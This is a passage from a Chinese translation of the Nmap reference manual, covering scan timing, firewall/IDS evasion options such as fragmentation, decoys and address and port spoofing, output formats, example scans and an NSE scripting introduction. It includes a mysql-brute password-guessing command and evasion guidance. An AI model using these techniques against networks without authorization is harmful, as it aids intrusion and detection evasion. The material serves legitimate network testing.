使用大的组。\n–max-hostgroup选项用于说明使用最大的组，Nmap不会超出这个大小。–min-hostgroup选项说明最小的组，Nmap 会保持组大于这个值。如果在指定的接口上没有足够的目标主机来满足所 指定的最小值，Nmap可能会采用比所指定的值小的组。这两个参数虽然很少使用， 但都用于保持组的大小在一个指定的范围之内。\n这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常 选择256来扫描C类网段。对于端口数较多的扫描，超出该值没有意义。对于 端口数较少的扫描，2048或更大的组大小是有帮助的。\n–min-parallelism ; –max-parallelism (调整探测报文的并行度)\n这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃， Nmap降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加。 这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值 可能为1，在好的条件下，可能会增长至几百。\n最常见的应用是–min-parallelism值大于1，以加快 性能不佳的主机或网络的扫描。这个选项具有风险，如果过高则影响准确度，同时 也会降低Nmap基于网络条件动态控制并行度的能力。这个值设为10较为合适， 这个值的调整往往作为最后的手段。\n–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文，和选择–scan-delay同时使用非常有用，虽然 这个选项本身的用途已经很好。\n–min-rtt-timeout ， –max-rtt-timeout ， –initial-rtt-timeout (调整探测报文超时)\nNmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新 发送探测报文。Nmap基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著 和不定，这个超时值会增加几秒。初始值的比较保守(高)，而当Nmap扫描无响应 的主机时，这个保守值会保持一段时间。\n这些选项以毫秒为单位，采用小的–max-rtt-timeout值，使 –initial-rtt-timeout值大于默认值可以明显减少扫描时间，特别 是对不能ping通的扫描(-P0)以及具有严格过滤的网络。如果使用太 小的值，使得很多探测报文超时从而重新发送，而此时可能响应消息正在发送，这使得整个扫描的时 间会增加。\n如果所有的主机都在本地网络，对于–max-rtt-timeout值来 说，100毫秒比较合适。如果存在路由，首先使用ICMP ping工具ping主机，或使用其 它报文工具如hpings，可以更好地穿透防火墙。查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。通常，不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms。\n–min-rtt-timeout这个选项很少使用，当网络不可靠时， Nmap的默认值也显得过于强烈，这时这个选项可起作用。当网络看起来不可靠时，Nmap仅将 超时时间降至最小值，这个情况是不正常的，需要向nmap-dev邮件列表报告bug。\n–host-timeout (放弃低速目标主机)\n由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因， 一些主机需要很长的时间扫描。这些极少数的主机扫描往往占 据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机，使用 –host-timeout选项来说明等待的时间(毫秒)。通常使用1800000 来保证Nmap不会在单个主机上使用超过半小时的时间。需要注意的是，Nmap在这半小时中可以 同时扫描其它主机，因此并不是完全放弃扫描。超时的主机被忽略，因此也没有针对该主机的 端口表、操作系统检测或版本检测结果的输出。\n–scan-delay ; –max-scan-delay (调整探测报文的时间间隔)\n这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽 控制的情况下这个选项非常有效。Solaris主机在响应UDP扫描探测报文报文时，每秒只发送一个ICMP消息，因此Nmap发送的很多数探测报文是浪费的。–scan-delay 设为1000，使Nmap低速运行。Nmap尝试检测带宽控制并相应地调整扫描的延迟，但 并不影响明确说明何种速度工作最佳。\n–scan-delay的另一个用途是躲闭基于阈值的入侵检测和预防 系统(IDS&#x2F;IPS)。\n-T &lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt; (设置时间模板)\n上述优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)。前两种模式用于IDS躲避，Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。默认模式为Normal，因此-T3 实际上是未做任何优化。Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描。Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。\n用户可以根据自己的需要选择不同的模板，由Nmap负责选择实际的时间值。 模板也会针对其它的优化控制选项进行速度微调。例如，-T4 针对TCP端口禁止动态扫描延迟超过10ms，-T5对应的值为5ms。 模板可以和优化调整控制选项组合使用，但模板必须首先指定，否则模板的标准值 会覆盖用户指定的值。建议在扫描可靠的网络时使用 -T4，即使 在自己要增加优化控制选项时也使用(在命令行的开始)，从而从这些额外的较小的优化 中获益。\n如果用于有足够的带宽或以太网连接，仍然建议使用-T4选项。 有些用户喜欢-T5选项，但这个过于强烈。有时用户考虑到避免使主机 崩溃或者希望更礼貌一些会采用-T2选项。他们并没意识到-T Polite选项是如何的慢，这种模式的扫描比默认方式实际上要多花10倍的时间。默认时间 选项(-T3)很少有主机崩溃和带宽问题，比较适合于谨慎的用户。不进行 版本检测比进行时间调整能更有效地解决这些问题。\n虽然-T0和-T1选项可能有助于避免IDS告警，但 在进行上千个主机或端口扫描时，会显著增加时间。对于这种长时间的扫描，宁可设定确切的时间 值，而不要去依赖封装的-T0和-T1选项。\nT0选项的主要影响是对于连续扫描，在一个时间只能扫描一个端口， 每个探测报文的发送间隔为5分钟。T1和T2选项比较类似， 探测报文间隔分别为15秒和0.4秒。T3是Nmap的默认选项，包含了并行扫描。 T4选项与 –max-rtt-timeout 1250 –initial-rtt-timeout 500 等价，最大TCP扫描延迟为10ms。T5等价于 –max-rtt-timeout 300 –min-rtt-timeout 50 –initial-rtt-timeout 250 –host-timeout 900000，最大TCP扫描延迟为5ms。\n防火墙&#x2F;IDS躲避和欺骗很多Internet先驱们设想了一个全球开放的网络，使用全局的IP 地址空间，使得任何两个节点之间都有虚拟连接。这使得主机间可以作为真 正的对等体，相互间提供服务和获取信息。人们可以在工作时访问家里所 有的系统、调节空调温度、为提前到来的客人开门。随后，这些全球连接的设想 受到了地址空间短缺和安全考虑的限制。在90年代早期，各种机构开始部 署防火墙来实现减少连接的目的，大型网络通过代理、NAT和包过滤器与未 过滤的Internet隔离。不受限的信息流被严格控制的可信通信通道信息流所替代。\n类似防火墙的网络隔离使得对网络的搜索更加困难，随意的搜 索变得不再简单。然而，Nmap提供了很多特性用于理解这些复杂的网 络，并且检验这些过滤器是否正常工作。此外，Nmap提供了绕过某些较弱的 防范机制的手段。检验网络安全状态最有效的方法之一是尝试哄骗网络，将 自己想象成一个攻击者，使用本节提供的技术来攻击自己的网络。如使用FTP bounce扫描、Idle扫描、分片攻击或尝试穿透自己的代理。\n除限止网络的行为外，使用入侵检测系统(IDS)的公司也不断增加。由于Nmap 常用于攻击前期的扫描，因此所有主流的IDS都包含了检测Nmap扫描的规则。 现在，这些产品变形为入侵预防系统(IPS)，可以主 动地阻止可疑的恶意行为。不幸的是，网络管理员和IDS厂商通过分析报文 来检测恶意行为是一个艰苦的工作，有耐心和技术的攻击者，在特定Nmap选项 的帮助下，常常可以不被IDS检测到。同时，管理员必须应付大量的误报结果， 正常的行为被误判而被改变或阻止。\n有时，人们建议Nmap不应该提供躲闭防火墙规则或哄骗IDS的功能， 这些功能可能会被攻击者滥用，然而管理员却可以利用这些功能来增强安全性。 实际上，攻击的方法仍可被攻击者利用，他们可以发现其它工具或Nmap的补丁程 序。同时，管理员发现攻击者的工作更加困难，相比较采取措施来预防执 行FTP Bounce攻击的工具而言，部署先进的、打过补丁的FTP服务器更 加有效。\nNmap不提供检测和破坏防火墙及IDS系统的魔弹(或Nmap选项)，它使用 的是技术和经验，这超出了本参考手册的范围，下面描述了相关的选项和 完成的工作。\n-f (报文分段); –mtu (使用指定的MTU)\n-f选项要求扫描时(包挺ping扫描)使用 小的IP包分段。其思路是将TCP头分段在几个包中，使得包过滤器、 IDS以及其它工具的检测更加困难。必须小心使用这个选项，有些系 统在处理这些小包时存在问题，例如旧的网络嗅探器Sniffit在接收 到第一个分段时会立刻出现分段错误。该选项使用一次，Nmap在IP 头后将包分成8个字节或更小。因此，一个20字节的TCP头会被分成3个 包，其中2个包分别有TCP头的8个字节，另1个包有TCP头的剩下4个字 节。当然，每个包都有一个IP头。再次使用-f可使用 16字节的分段(减少分段数量)。使用–mtu选项可 以自定义偏移的大小，使用时不需要-f，偏移量必须 是8的倍数。包过滤器和防火墙对所有的IP分段排队，如Linux核心中的 CONFIG-IP-ALWAYS-DEFRAG配置项，分段包不会直接使用。一些网络无法 承受这样所带来的性能冲击，会将这个配置禁止。其它禁止的原因有分段 包会通过不同的路由进入网络。一些源系统在内核中对发送的报文进行 分段，使用iptables连接跟踪模块的Linux就是一个例子。当使用类似Ethereal 的嗅探器时，扫描必须保证发送的报文要分段。如果主机操作系统会产 生问题，尝试使用–send-eth选项以避开IP层而直接 发送原始的以太网帧。\n-D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)\n为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。 IDS可能会报个某个IP的5-10个端口扫描，但并不知道哪个IP在扫描以及 哪些不是诱饵。但这种方式可以通过路由跟踪、响应丢弃以及其它主动 机制在解决。这是一种常用的隐藏自身IP地址的有效技术。\n使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，这时可使用 ME选项说明。如果在第6个位置或 更后的位置使用ME选项，一些常用 端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告 这个真实IP。如果不使用ME选项，Nmap 将真实IP放在一个随机的位置\n注意，作为诱饵的主机须在工作状态，否则会导致目标主机的SYN洪水攻击。 如果在网络中只有一个主机在工作，那就很容易确定哪个主机在扫描。也可 使用IP地址代替主机名(被诱骗的网络就不可能在名字服务器日志中发现)。\n诱饵可用在初始的ping扫描(ICMP、SYN、ACK等)阶段或真正的端口扫描 阶段。诱饵也可以用于远程操作系统检测(-O)。在进行版 本检测或TCP连接扫描时，诱饵无效。\n使用过多的诱饵没有任何价值，反而导致扫描变慢并且结果不准确。 此外，一些ISP会过滤哄骗的报文，但很多对欺骗IP包没有任何限制。\n-S  (源地址欺骗)\n在某些情况下，Nmap可能无法确定你的源地址(如果这样，Nmap会给出 提示)。此时，使用-S选项并说明所需发送包的接口IP地址。\n这个标志的另一个用处是哄骗性的扫描，使得目标认为是另 一个地址在进行扫描。可以想象某一个竞争对手在不断扫描某个公司！ -e选项常在这种情况下使用，也可采用-P0选项。\n-e (使用指定的接口)\n告诉Nmap使用哪个接口发送和接收报文，Nmap可以进行自动检测， 如果检测不出会给出提示。\n–source-port ; -g (源端口欺骗)\n仅依赖于源端口号就信任数据流是一种常见的错误配置，这个问题非常 好理解。例如一个管理员部署了一个新的防火墙，但招来了很多用户的不满，因为 他们的应用停止工作了。可能是由于外部的UDP DNS服务器响应无法进入网络，而导致 DNS的崩溃。FTP是另一个常见的例子，在FTP传输时，远程服务器尝试和内部用 建立连接以传输数据。\n对这些问题有安全解决方案，通常是应用级代理或协议分析防火墙模块。 但也存在一些不安全的方案。注意到DNS响应来自于53端口，FTP连接 来自于20端口，很多管理员会掉入一个陷阱，即允许来自于这些端口的数据进入 网络。他们认为这些端口里不会有值得注意的攻击和漏洞利用。此外，管理员 或许认为这是一个短期的措施，直至他们采取更安全的方案。但他们忽视了安全的 升级。\n不仅仅是工作量过多的网络管理员掉入这种陷阱，很多产品本身也会有这类 不安全的隐患，甚至是微软的产品。Windows 2000和Windows XP中包含的IPsec过滤 器也包含了一些隐含规则，允许所有来自88端口(Kerberos)的TCP和UDP数据流。另 一个常见的例子是Zone Alarm个人防火墙到2.1.25版本仍然允许源端口53(DNS)或 67(DHCP)的UDP包进入。\nNmap提供了-g和–source-port选项(它们是 等价的)，用于利用上述弱点。只需要提供一个端口号，Nmap就可以从这些 端口发送数据。为使特定的操作系统正常工作，Nmap必须使用不同的端口号。 DNS请求会忽略–source-port选项，这是因为Nmap依靠系 统库来处理。大部分TCP扫描，包括SYN扫描，可以完全支持这些选项，UDP扫 描同样如此。\n–data-length (发送报文时附加随机数据)\n正常情况下，Nmap发送最少的报文，只含一个包头。因此TCP包通常 是40字节，ICMP ECHO请求只有28字节。这个选项告诉Nmap在发送的报文上 附加指定数量的随机字节。操作系统检测(-O)包不受影响， 但大部分ping和端口扫描包受影响，这会使处理变慢，但对扫描的影响较小。\n–ttl (设置IP time-to-live域)\n设置IPv4报文的time-to-live域为指定的值。\n–randomize-hosts (对目标主机的顺序随机排列)\n告诉Nmap在扫描主机前对每个组中的主机随机排列，最多可达 8096个主机。这会使得扫描针对不同的网络监控系统来说变得不是很 明显，特别是配合值较小的时间选项时更有效。如果需要对一个较大 的组进行随机排列，需要增大nmap.h文件中 PING-GROUP-SZ的值，并重新编译。另一种方法是使用列表扫描 (-sL -n -oN )，产生目标IP的列表， 使用Perl脚本进行随机化，然后使用-iL提供给Nmap。\n–spoof-mac &lt;mac address，prefix，or vendor name&gt; (MAC地址欺骗)\n要求Nmap在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包。MAC地址有几 种格式。如果简单地使用字符串“0”，Nmap选择一个完全随机的MAC 地址。如果给定的字符品是一个16进制偶数(使用:分隔)，Nmap将使用这个MAC地址。 如果是小于12的16进制数字，Nmap会随机填充剩下的6个字节。如果参数不是0或16进 制字符串，Nmap将通过nmap-mac-prefixes查找 厂商的名称(大小写区分)，如果找到匹配，Nmap将使用厂商的OUI(3字节前缀)，然后 随机填充剩余的3个节字。正确的–spoof-mac参数有， Apple， 0，01:02:03:04:05:06， deadbeefcafe，0020F2和Cisco。\n输出任何安全工具只有在输出结果时才是有价值的，如果没有通过组织和易于理解的方式来表达，复杂的测试和算法几乎没有意义。Nmap提供了一些方式供用户和其它软件使用，实际上，没有一种方式可以使所有人满意。 因此Nmap提供了一些格式，包含了方便直接查看的交互方式和方便软件处理的XML格式。\n除了提供输出格式外，Nmap还提供了选项来控制输出的细节以及调试 信息。输出内容可发送给标准输出或命名文件，可以追加或覆盖。输出文件还可 被用于继续中断的扫描。\nNmap提供5种不同的输出格式。默认的方式是interactive output， 发送给标准输出(stdout)。normal output方式类似于 interactive，但显示较少的运行时间信息 和告警信息，这是由于这些信息是在扫描完全结束后用于分析，而不是交互式的。\nXML输出是最重要的输出类型，可被转换成HTML，对于程序处理非常方便， 如用于Nmap图形用户接口或导入数据库。\n另两种输出类型比较简单，grepable output格式，在一行中包含目标主机最多的信息；sCRiPt KiDDi3 0utPUt 格式，用于考虑自己的用户 |&lt;-r4d。\n交互式输出是默认方式，没有相应的命令行选项，其它四种格式选项 使用相同的语法，采用一个参数，即存放结果的文件名。多种格式可同时 使用，但一种格式只能使用一次。例如，在标准输出用于查看的同时，可将结 果保存到XML文件用于程序分析，这时可以使用选项-oX myscan.xml -oN myscan.nmap。 为便于描述的简化，本章使用类似于myscan.xml的简单文件名， 建议采用更具有描述性的文件名。文件名的选择与个人喜好有关，建议增加 扫描日期以及一到两个单词来描述，并放置于一个目录中。\n在将结果输出到文件的同时，Nmap仍将结果发送给标准输出。例如， 命令nmap -oX myscan.xml target将 输出XML至myscan.xml，并在stdout 上打印相同的交互式结果，而此时-oX选项没有采用。可以 使用连字符作为选项来改变，这使得Nmap禁止交互式输出，而是将结果打印到 所指定的标准输出流中。因此，命令nmap -oX - target只 输出XML至标准输出stdout。严重错误仍然是输出到标准错误流stderr中。\n与其它Nmap参数不同，日志文件选项的空格(如-oX)和 文件名或连字符是必需的。如果省略了标记，例如-oG-或 -oXscan.xml，Nmap的向后兼容特点将建立 标准格式的输出文件，相应的文件名为G-和 Xscan.xml。\nNmap还提供了控制扫描细节以及输出文件的添加或覆盖的选项，这些选项如下所述。\nNmap输出格式：\n-oN (标准输出)\n要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。\n-oX (XML输出)\n要求XML输出直接写入指定 的文件。Nmap包含了一个文档类型定义(DTD)，使XML解析器有效地 进行XML输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap的XML输出。DTD定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在http://www.insecure.org/nmap/data/nmap.dtd获取。\nXML提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的XML解析器，如C&#x2F;C++，Perl，Python和Java。 针对这些语言有一些捆绑代码用于处理Nmap的输出和特定的执行程序。 例如perl CPAN中的Nmap::Scanner和Nmap::Parser。 对几乎所有与Nmap有接口的主要应用来说，XML是首选的格式。\nXML输出引用了一个XSL样式表，用于格式化输出结果，类似于 HTML。最方便的方法是将XML输出加载到一个Web浏览器，如Firefox 或IE。由于nmap.xsl文件的绝对 路径，因此通常只能在运行了Nmap的机器上工作(或类似配置的机器)。 类似于任何支持Web机器的HTML文件，–stylesheet 选项可用于建立可移植的XML文件。\n-oS (ScRipT KIdd|3 oUTpuT)\n脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 ‘l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。\n-oG (Grep输出)\n这种方式最后介绍，因为不建议使用。XML输格式很强大，便于有经验 的用户使用。XML是一种标准，由许多解析器构成，而Grep输届更简化。XML 是可扩展的，以支持新发布的Nmap特点。使用Grep输出的目的是忽略这些 特点，因为没有足够的空间。\n然面，Grep输出仍然很常使用。它是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。常可 用于在命令行上进行一次性测式。查找ssh端口打开或运行Sloaris的主机，只需 要一个简单的grep主机说明，使用通道并通过awk或cut命令打印所需的域。\nGrep输出可以包含注释(每行由#号开始)。每行由6个标记的域组成，由制表符及 冒号分隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID和状态。\n这些域中最重要的是Ports，它提供 了所关注的端口的细节，端口项由逗号分隔。每个端口项代表一个所关注的端口， 每个子域由&#x2F;分隔。这些子域有：端口号， 状态，协议， 拥有者，服务， SunRPCinfo和版本信息。\n对于XML输出，本手册无法列举所有的格式，有关Nmap Grep输出的更详细信息可查阅http://www.unspecific.com/nmap-oG-output。\n-oA (输出至所有格式)\n为使用方便，利用-oA选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 .nmap，.xml和 .gnmap文件中。也可以在文件名前 指定目录名，如在UNIX中，使用~&#x2F;nmaplogs&#x2F;foocorp&#x2F;， 在Window中，使用c:\\hacking\\sco on Windows。\n细节和调试选项\n-v (提高输出信息的详细度)\n通过提高详细度，Nmap可以输出扫描过程的更多信息。 输出发现的打开端口，若Nmap认为扫描需要更多时间会显示估计 的结束时间。这个选项使用两次，会提供更详细的信息。这个选 项使用两次以上不起作用。\n大部分的变化仅影响交互式输出，也有一些影响标准和脚本 小子输出。其它输出类型由机器处理，此时Nmap默认提供详细的信 息，不需要人工干预。然而，其它模式也会有一些变化，省略一些 细节可以减小输出大小。例如，Grep输出中的注释行提供所有扫描 端口列表，但由于这些信息过长，因此只能在细节模式中输出。\n-d [level] (提高或设置调试级别)\n当详细模式也不能为用户提供足够的数据时，使用调试可以得到更 多的信息。使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别。也可在-d 后面使用参数设置调试级别。例如，-d9设定级别9。这是 最高的级别，将会产生上千行的输出，除非只对很少的端口和目标进行简单扫描。\n如果Nmap因为Bug而挂起或者对Nmap的工作及原理有疑问，调试输出 非常有效。主要是开发人员用这个选项，调试行不具备自我解释的特点。 例如，Timeoutvals: srtt: -1 rttvar: -1 to: 1000000 delta 14987 &#x3D;&#x3D;&gt; srtt: 14987 rttvar: 14987 to: 100000。如果对某行输出不明白， 可以忽略、查看源代码或向开发列表(nmap-dev)求助。有些输出行会有自 我解释的特点，但随着调试级别的升高，会越来越含糊。\n–packet-trace (跟踪发送和接收的报文)\n要求Nmap打印发送和接收的每个报文的摘要，通常用于 调试，有助于新用户更好地理解Nmap的真正工作。为避免输出过 多的行，可以限制扫描的端口数，如-p20-30。 如果只需进行版本检测，使用–version-trace。\n–iflist (列举接口和路由)\n输出Nmap检测到的接口列表和系统路由，用于调试路由 问题或设备描述失误(如Nmap把PPP连接当作以太网对待)。\n其它输出选项：\n–append-output (在输出文件中添加)\n当使用文件作为输出格式，如-oX或-oN， 默认该文件被覆盖。如果希望文件保留现有内容，将结果添加在现 有文件后面，使用–append-output选项。所有指 定的输出文件都被添加。但对于XML(-oX)扫描输出 文件无效，无法正常解析，需要手工修改。\n–resume (继续中断的扫描)\n一些扩展的Nmap运行需要很长的时间 – 以天计算，这类扫描 往往不会结束。可以进行一些限制，禁止Nmap在工作时间运行，导致 网络中断、运行Nmap的主机计划或非计划地重启、或者Nmap自己中断。 运行Nmap的管理员可以因其它原因取消运行，按下ctrl-C 即可。从头开始启动扫描可能令人不快，幸运的是，如果标准扫描 (-oN)或Grep扫描(-oG)日志 被保留，用户可以要求Nmap恢复终止的扫描，只需要简单地使用选项 –resume并说明标准&#x2F;Grep扫描输出文件，不允许 使用其它参数，Nmap会解析输出文件并使用原来的格式输出。使用方式 如nmap –resume 。 Nmap将把新地结果添加到文件中，这种方式不支持XML输出格式，原因是 将两次运行结果合并至一个XML文件比较困难。\n–stylesheet (设置XSL样式表，转换XML输出)\nNmap提从了XSL样式表nmap.xsl，用于查看 或转换XML输出至HTML。XML输出包含了一个xml-stylesheet， 直接指向nmap.xml文件， 该文件由Nmap安装(或位于Windows当前工作目录)。在Web浏览器 中打开Nmap的XML输出时，将会在文件系统中寻找nmap.xsl文件， 并使用它输出结果。如果希望使用不同的样式表，将它作为 –stylesheet的参数，必段指明完整的路 径或URL，常见的调用方式是–stylesheet http://www.insecure.org/nmap/data/nmap.xsl。 这告诉浏览器从Insecire.Org中加载最新的样式表。这使得 没安装Nmap(和nmap.xsl) 的机器中可以方便地查看结果。因此，URL更方便使用，本地文件系统 的nmap.xsl用于默认方式。\n–no-stylesheet (忽略XML声明的XSL样式表)\n使用该选项禁止Nmap的XML输出关联任何XSL样式表。 xml-stylesheet指示被忽略。\n其它选项本节描述一些重要的(和并不重要)的选项，这些选项 不适合其它任何地方。\n-6 (启用IPv6扫描)\n从2002年起，Nmap提供对IPv6的一些主要特征的支持。ping扫描(TCP-only)、 连接扫描以及版本检测都支持IPv6。除增加-6选项外， 其它命令语法相同。当然，必须使用IPv6地址来替换主机名，如 3ffe:7501:4819:2000:210:f3ff:fe03:14d0。 除“所关注的端口”行的地址部分为IPv6地址。\nIPv6目前未在全球广泛采用，目前在一些国家(亚洲)应用较多， 一些高级操作系统支持IPv6。使用Nmap的IPv6功能，扫描的源和目 的都需要配置IPv6。如果ISP(大部分)不分配IPv6地址，Nmap可以采用 免费的隧道代理。一种较好的选择是BT Exact，位于https://tb.ipv6.btexact.com/。 此外，还有Hurricane Electric，位于http://ipv6tb.he.net/。6to4隧道是 另一种常用的免费方法。\n-A (激烈扫描模式选项)\n这个选项启用额外的高级和高强度选项，目前还未确定代表 的内容。目前，这个选项启用了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全面的扫描选项集合，不需要用户记忆大量的 选项。这个选项仅仅启用功能，不包含用于可能所需要的 时间选项(如-T4)或细节选项(-v)。\n–datadir (说明用户Nmap数据文件位置)\nNmap在运行时从文件中获得特殊的数据，这些文件有 nmap-service-probes， nmap-services， nmap-protocols， nmap-rpc， nmap-mac-prefixes和 nmap-os-fingerprints。Nmap首先 在–datadir选项说明的目录中查找这些文件。 未找到的文件，将在BMAPDIR环境变量说明的目录中查找。 接下来是用于真正和有效UID的~&#x2F;.nmap 或Nmap可执行代码的位置(仅Win32)；然后是是编译位置， 如&#x2F;usr&#x2F;local&#x2F;share&#x2F;nmap 或&#x2F;usr&#x2F;share&#x2F;nmap。 Nmap查找的最后一个位置是当前目录。\n–send-eth (使用原以太网帧发送)\n要求Nmap在以太网(数据链路)层而不是IP(网络层)发送 报文。默认方式下，Nmap选择最适合其运行平台的方式，原套接 字(IP层)是UNIX主机最有效的方式，而以太网帧最适合Windows操作 系统，因为Microsoft禁用了原套接字支持。在UNIX中，如果没有其 它选择(如无以太网连接)，不管是否有该选项，Nmap都使用原IP包。\n–send-ip (在原IP层发送)\n要求Nmap通过原IP套接字发送报文，而不是低层的以 太网帧。这是–send-eth选项的补充。\n–privileged (假定用户具有全部权限)\n告诉Nmap假定其具有足够的权限进行源套接字包发送、 报文捕获和类似UNIX系统中根用户操作的权限。默认状态下， 如果由getuid()请求的类似操作不为0，Nmap将退出。 –privileged在具有Linux内核性能的类似 系统中使用非常有效，这些系统配置允许非特权用户可以进行 原报文扫描。需要明确的是，在其它选项之前使用这些需要权 限的选项(SYN扫描、操作系统检测等)。Nmap-PRIVILEGED变量 设置等价于–privileged选项。\n-V; –version (打印版本信息)\n打印Nmap版本号并退出。\n-h; –help (打印帮助摘要面)\n打印一个短的帮助屏幕，列出大部分常用的 命令选项，这个功能与不带参数运行Nmap是相同的。\n运行时交互Nmap目前还不具有这个功能，本节内容可能会增加或删除。\n在执行Nmap时，所有的键盘敲击都被记录。这使得用户可以与 程序交互而不需要终止或重启。特定的键可改变选项，其它键会输出 一个有关扫描的状态消息。约定如下，小写字母增加 打印量，大写字母减少打印量。\nv &#x2F; V 增加&#x2F;减少细节\nd &#x2F; D 提高&#x2F;降低调试级别\np &#x2F; P 打开&#x2F;关闭报文跟踪\n其它 打印的信息类似于：\nStats: 0:00:08 elapsed; 111 hosts completed (5 up)， 5 undergoing Service Scan\nService scan Timing: About 28.00% done; ETC: 16:18 (0:00:15 remaining)\n实例下面给出一些实例，简单的、复杂的到深奥的。为更具体，一 些例子使用了实际的IP地址和域名。在这些位置，可以使用你自己网络 的地址&#x2F;域名替换。注意，扫描其它网络不一定合法，一些网络管理员不愿看到 未申请过的扫描，会产生报怨。因此，先获得允许是最好的办法。\n如果是为了测试，scanme.nmap.org 允许被扫描。但仅允许使用Nmap扫描并禁止测试漏洞或进行DoS攻击。为 保证带宽，对该主机的扫描每天不要超过12次。如果这个免费扫描服务被 滥用，系统将崩溃而且Nmap将报告解析 指定的主机名&#x2F;IP地址失败：scanme.nmap.org。这些免 费扫描要求也适用于scanme2.nmap.org、 scanme3.nmap.org等等，虽然这些 主机目前还不存在。\nnmap -v scanme.nmap.org\n这个选项扫描主机scanme.nmap.org中 所有的保留TCP端口。选项-v启用细节模式。\nnmap -sS -O scanme.nmap.org&#x2F;24\n进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段 的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。\nnmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127\n进行主机列举和TCP扫描，对象为B类188.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。\nnmap -v -iR 100000 -P0 -p 80\n随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段 发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因 此使用-P0禁止对主机列表。\nnmap -P0 -p80 -oX logs&#x2F;pb-port80scan.xml -oG logs&#x2F;pb-port80scan.gnmap 216.163.128.20&#x2F;20\n扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。\nhost -l company.com | cut -d -f 4 | nmap -v -iL\n进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU&#x2F;Linux – 其它系统进行区域传输时有不同的命令。\nnmap nse脚本引擎Nmap是学习网络安全必备的一款工具，有着强大的信息收集能力。Nmap不仅仅是一个端口扫描器那么简单，它还有着一个强大的脚本引擎（NSE）可以通过编程来实现定制化。\n在nmap安装目录中,通常搜索路径为&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts目录存放着NSE脚本，而nselib目录存放各种库文件，通常使用–script来指定要使用的nmap脚本。比如：使用mysql-brute.nse这个脚本对目标地址进行mysql的口令爆破。命令：\nnmap --script&#x3D;mysql-brute  &lt;target&gt;,\n\n在Nmap的官方说明文档https://nmap.org/nsedoc/中有NSE脚本和库文件的详细使用说明。\nNSE编写demo文件:LUA语言基础打开任何一个NSE脚本或者是库文件，里面的代码功能通常由lua语言来实现。因此想要写自己的脚本或者库，前提是有一定的lua语言基础。lua是一个轻量化的脚本语言，有编程基础的同学学lua应该会比较轻松，在菜鸟教程花个把小时学习lua语言的基本使用，已经足够明白本篇的编程内容了。\nNSE脚本基本格式:一个完整的NSE脚本通常都有这么几个部分的代码字段：description 字段：本脚本的说明介绍。categories 字段：本脚本的分类。Nmap执行脚本除了指定单个脚本外，还可以指定某一类脚本，比如default类，我们没有使用–script参数时，默认会加载这一类的脚本。rule 字段：本脚本的执行规则，也即触发脚本执行的条件会在rule字段定义。一般执行规则是一个lua函数，返回值只有true和false两种。action字段：脚本执行的具体内容。rule字段返回true时会执行action字段定义的函数。\n-- 包含nselib中的包\nlocal shortport &#x3D; require &quot;shortport&quot;\n-- 描述\ndescription &#x3D; [[a demo nse file]]\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n-- 在发现主机端口时,被调用\nportrule &#x3D; function( host, port )\n    return true\nend\n-- 当portrule返回true时action被执行\naction &#x3D; function(host, 